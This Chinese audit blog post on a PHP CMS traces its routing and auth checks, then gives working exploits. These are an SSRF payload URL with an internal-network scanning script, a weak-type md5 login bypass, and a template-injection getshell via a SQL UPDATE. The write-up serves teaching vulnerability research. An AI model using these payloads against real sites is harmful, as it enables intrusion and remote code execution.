### 0x00 前言

最近在整理自己代码审计的文档时,发现自己以前审了不少小cms的1day, 现在的话基本没啥用,所以打算慢慢发出来，分享一下自己在学习各种语言审计时的一些小思路, 希望能够帮助和我一样的萌新能够领略代码审计的魅力。

> 下面的过程基本就是我当时审计的完整状态,所以我觉得萌新对自己可以有点信心，很多事情其实自己也可以做到的。

### 0x01 确定路由

`wq2/wq2/framework/bootstrap.inc.php`

```php
$controller = $_GPC['c'];
$action = $_GPC['a'];
$do = $_GPC['do'];
```

加载模块

![image-20200614115030584](https://shs3.b.qianxin.com/butian_public/f9b083f71f51839f560faf7ef9130d16b.jpg)

![image-20200614120451314](https://shs3.b.qianxin.com/butian_public/f7ebb526f341465d0da2ffb26ee4a70bd.jpg)

![image-20200614120537572](https://shs3.b.qianxin.com/butian_public/ffc5c64c27817bb1233939166b5c2831b.jpg)

跳转到控制器

![image-20200614121915623](https://shs3.b.qianxin.com/butian_public/f8f72ea66474df3b1dcb2b79937cfa39c.jpg)

0x02 确定鉴权
---------

这里我们可以通过定位user下的文件来确定

```php
if (is_array($acl[$controller]['direct']) && in_array($action, $acl[$controller]['direct'])) {
    require _forward($controller, $action);
    exit();}
checklogin();
```

这里主要是通过`acl`进行判断,如果action在这个控制器的的direct数组下的的话，则不需要进行`checklogin`校验,否则则需要校验

简单回溯下:

`$acl = require IA_ROOT . '/web/common/permission.inc.php';`

![image-20200622093731427](https://shs3.b.qianxin.com/butian_public/f69981a64a35b65889f91c3ff0286f12e.jpg)

接下来我们可以分析下`checklogin`函数

```PHP
function checklogin() {
    global $_W;
    if (empty($_W['uid'])) {
        if (!empty($_W['setting']['copyright']['showhomepage'])) {
            itoast('', url('account/welcome'), 'warning');
        } else {
            itoast('', url('user/login'), 'warning');
        }
    }
    return true;
}

```

可以看到主要是通过全局的`$_W['uid']`如果不为空，则验证通过。

![image-20200622095240928](https://shs3.b.qianxin.com/butian_public/f3e6e24f9bbeab6906d9f8e57d9190978.jpg)

这里我们跟进下登录文件

web/source/user/login.ctrl.php

![image-20200622114714695](https://shs3.b.qianxin.com/butian_public/f51fd544cb06a733d0834cb9229e63d70.jpg)

`$record`是查询返回的结果,在`user_single`对用户和密码进行了校验

如果`$record`不为空,则可以登录

![image-20200622115452956](https://shs3.b.qianxin.com/butian_public/f5a59c1f7f3ab45923cccdd3861dacc97.jpg)

还有几个设置`$_W["uid"]`的地方

![image-20200622115833192](https://shs3.b.qianxin.com/butian_public/f2a2d7333917aa867e0705e69de90cb89.jpg)

都是基于`$session`的值来判断的。

0x03 确定挖洞思路
-----------

1.挖不需要授权的direct之类的

> ```php
> 'account' => array(
> 'default' => '',
> 'direct' => array(
> 'auth',
> 'welcome',
> ),
> 
> 'article' => array(
> 'default' => '',
> 'direct' => array(
> 'notice-show',
> 'news-show',
> ),
> 
> 'direct' => array(
> 'touch',
> 'dock',
> ),
> 
> 'cron' => array(
> 'default' => '',
> 'direct' => array(
> 'entry',
> ),
> 'site' => array(
> 'default' => '',
> 'direct' => array(
> 'entry',
> ),
> 
> 'user' => array(
> 'default' => 'display',
> 'direct' => array(
> 'login',
> 'register',
> 'logout',
> 'find-password',
> 'third-bind'
> ),
> 
> 'utility' => array(
> 'default' => '',
> 'direct' => array(
> 'verifycode',
> 'code',
> 'file',
> 'bindcall',
> 'subscribe',
> 'wxcode',
> 'modules',
> 'link',
> ),
> 
> ```

2.根据功能点来测试，观察整个流程是否有绕过的点。

3.测用户和后台权限的功能点(很多都不开放注册，鸡肋)

0x04 前台某处可回显SSRF
----------------

通过搜索关键字，确定了几个可能存在漏洞方法

```PHP
ihttp_request
sendHttpRequest
SendCurl
send_request
send_http
send_http_synchronous
```

后面根据这些方法进行回溯系统流程:

![image-20200614170556274](https://shs3.b.qianxin.com/butian_public/f87eb000d79b9360303930657acba069a.jpg)

可控,但是在

![image-20200622124542294](https://shs3.b.qianxin.com/butian_public/fe43712a5cdbe4cba129bd85609c75449.jpg)

这里系统限制了只能使用http,https

![image-20200614170608450](https://shs3.b.qianxin.com/butian_public/f7aab22c72e140f915d395902ec0e8bc1.jpg)

还有限制了一些内网ip的host,

![image-20200622124615165](https://shs3.b.qianxin.com/butian_public/f516504410f025cb5ea5b4a95fbbe2009.jpg)

由于curl设置了跟随，可以`header('Location: dict://lcoalhost:3306')`绕过限制

![image-20200622124829669](https://shs3.b.qianxin.com/butian_public/f41903890323d6d6435a32c2ee25c452c.jpg)

payload:

```php
http://host/web/index.php?c=utility&a=wxcode&do=image&attach=http://127.0.1.13:80/
```

**效果:**

![image-20200625105641759](https://shs3.b.qianxin.com/butian_public/f97778a1a575533a50eca7b4979db2565.jpg)

可以用来探测服务，gopher、dict批量打redis等等

当时写的探测脚本:

```python3

#!/usr/bin/python3
# -*- coding:utf-8 -*-

import requests
import time
import threading, queue

# res = requests.get('target/web/index.php?c=utility&a=wxcode&do=image&attach=http://127.0.0.1:80/')
# print(res
# .content)
# 
myQueue = queue.Queue()
Lock = threading.Lock()
okList = []

def produce():
    for i in range(1,255):
        for j in range(1,254):
            ip =  '192.168.{a}.{b}'.format(a=i, b=j)
            # print("try ip:{ip}".format(ip=ip))
            url = 'http://target/web/index.php?c=utility&a=wxcode&do=image&attach=http://{ip}:80/'.format(ip=ip)
            myQueue.put(url)
    print("Load target Done!!!")

def work():
    while True:
        try:
            url = myQueue.get()
        except:
            if myQueue.empty():
                break
        print("try: {u}".format(u=url))
        try:
            res = requests.get(url, timeout=2)
            if res.status_code == 200:
                Lock.acquire()
                print("ok ip: {ip}".format(ip=ip))
                okList.append(ip)
                Lock.release()
        except Exception as e:
            print("[worker] error,e:{e}".format(e=e))

def main():
    produce()
    threadingNum = 50
    myThread = []
    for i in range(threadingNum):
        t = threading.Thread(target=work)
        myThread.append(t)
        t.start()
    for t in myThread:
        t.join()
    print("ok, work Done")
    print(okList)

if __name__ == '__main__':
    main()
```

0x05 绕过后台登录
-----------

这里主要是存在弱类型的问题,导致可以fuzz然后绕过后台登录。

![image-20200624130743314](https://shs3.b.qianxin.com/butian_public/f041f8c8061b027e6ea697affa7345091.jpg)

首先hash的加密规则:`$record['hash'] = md5($record['password'] . $record['salt']);`

![image-20200624130432293](https://shs3.b.qianxin.com/butian_public/f6784734db2c28764cd24e8ea2a77e293.jpg)

![image-20200624130842639](https://shs3.b.qianxin.com/butian_public/f243af1b1b50911bf2469958ef6ccf477.jpg)

![image-20200624130448792](https://shs3.b.qianxin.com/butian_public/fcfce68f571cbe35755799e66f245bad8.jpg)

如果管理员密码的md5为数字开头

我们可以通过爆破开头的数字来进行绕过进入系统里面。  
如admin888和password888  
![image-20200624130842639](https://shs3.b.qianxin.com/butian_public/f87cbe36db00d1747283e0b237e682ef8.jpg)  
![image-20200624130842639](https://shs3.b.qianxin.com/butian_public/fac49d2b21ceb399b3e337173309e8fa4.jpg)

0x06 后台绕过getshell
-----------------

这个点可能通杀所有版本吧

首先我们进入站点-&gt;数据库处执行语句:

```php
UPDATE `ims_site_page` SET `uniacid` = '1' , `multiid` = '0' , `title` = '快捷菜单' , `description` = '' , `status` = '0' , `type` = '2' , `params` = '1' , `html` = '{if phpinfo())//}' , `createtime` = '1593049546' WHERE `id` = '1'
```

然后访问:

`/app/index.php?i=1&c=home&a=page&id=1`

![image-20200625103249758](https://shs3.b.qianxin.com/butian_public/f471fd6014513faf4ea858fe1a18ee103.jpg)

**分析成因:**

跟进: app/source/home/page.ctrl.php

```php
if($do == 'getnum'){
........
} else {
    $footer_off = true;
    template_page($id);  // 跟进这里
}
```

![image-20200625103611300](https://shs3.b.qianxin.com/butian_public/fa20316921c6c009cebb9c168060526a4.jpg)

```PHP
$page['html'] = str_replace(array('<?', '<%', '<?php', '{php'), '_', $page['html']);
```

这里可以看到进行了一些过滤,基本扼杀了我们的想法，我们继续跟下去

![image-20200625104658820](https://shs3.b.qianxin.com/butian_public/fa73254705458e8942644f37f2040f282.jpg)

可以看到`$content`进入了`template_parse`

出来之后，直接写入了模板文件中。

我们跟进`template_parse`

![image-20200625104906947](https://shs3.b.qianxin.com/butian_public/ff26507bfef105bb362b533f6c2e7551f.jpg)

可以发现模板为了解析标签，主动为我们补了个`<?php`那可真的是太好了。

这里我选这个点来分析:

`$str = preg_replace('/{if\s+(.+?)}/', '<?php if($1) { ?>', $str);`

这里的意思就是

将除了空格的内容放到`$1`

`{if phpinfo())//}` =&gt;`<?php if(phpinfo())//) { ?>`

这里我们可以利用php的`//`注释特性来闭合错误，其实还有很多方法来闭合错误。

最后在

![image-20200625105249791](https://shs3.b.qianxin.com/butian_public/ff58a05ebd87f104240d3b3a875554e0f.jpg)

直接include了模板,成功getshell。

0x07 总结
-------

非常简单的的一个漏洞组合链实现getshell，我觉得审计的话, 还是需要一些系统地思路，比如我就喜欢先确定路由-&gt;确定鉴权-&gt;前台漏洞挖掘-&gt;后台漏洞挖掘这种思路,但是对于不太熟悉的语言,我会使用关键字的方法, 期待能继续与你们分享。